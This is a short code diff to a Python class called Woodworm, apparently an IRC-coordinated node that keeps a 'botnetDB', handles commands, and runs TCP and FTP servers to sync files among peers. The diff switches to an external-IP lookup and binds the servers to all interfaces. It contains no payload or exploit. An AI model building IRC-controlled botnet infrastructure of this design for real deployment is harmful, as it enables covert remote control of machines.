@@ -10,7 +10,7 @@ from ftp import ftp_services
 import logging
 import displacement_handler
 import command_handler
-from tools import timer
+from tools import timer, ip
 import random
 
 
@@ -32,14 +32,14 @@ class Woodworm:
         self.ftpUser = config['ftp']['user']
         self.ftpPassword = config['ftp']['password']
         self.ftpPassiveRange = range(int(config['ftp']['passiveRangeStart']), int(config['ftp']['passiveRangeStop']))
-        self.my_ip = socket.gethostbyname(socket.gethostname())
+        self.my_ip = ip.Ip.get_external_ip_requests()
 
         self.getFileListTimer = timer.Timer(self.fileListRefreshTime, self.timer_onGetFilesTimeout, False)  
         self.syncRandomFile = timer.Timer(self.fileSyncTime, self.timer_onSyncRandomFileTimeout, False) 
 
         self.myContext = context.Context(self.ircNick, self.my_ip, self.tcpPort, self.pathToFiles)
 
-        self.tcp_server = tcp_services.TCPServer(self.my_ip, self.tcpPort)        
+        self.tcp_server = tcp_services.TCPServer("0.0.0.0", self.tcpPort)        
         self.tcp_server.onConnectionRegistered.subscribe(self.tcpServer_onConnectionReceived)
 
         self.irc_connection = irc_service.IRCConnection(self.ircServer, self.domain, self.ircServerPort, self.ircNick, self.channel)
@@ -49,7 +49,7 @@ class Woodworm:
         self.displacement_handler = displacement_handler.DisplacementHandler(self.myContext, self.botnetDB, self.irc_connection)
         self.command_handler = command_handler.CommandHandler(self.myContext, self.botnetDB, self.irc_connection)
         
-        self.ftp = ftp_services.FTPServer(self.my_ip, self.ftpPort, self.ftpUser, self.ftpPassword, self.ftpPassiveRange, self.pathToFiles)
+        self.ftp = ftp_services.FTPServer("0.0.0.0", self.ftpPort, self.ftpUser, self.ftpPassword, self.ftpPassiveRange, self.pathToFiles)
 
         self.getFileListTimer.start()
 
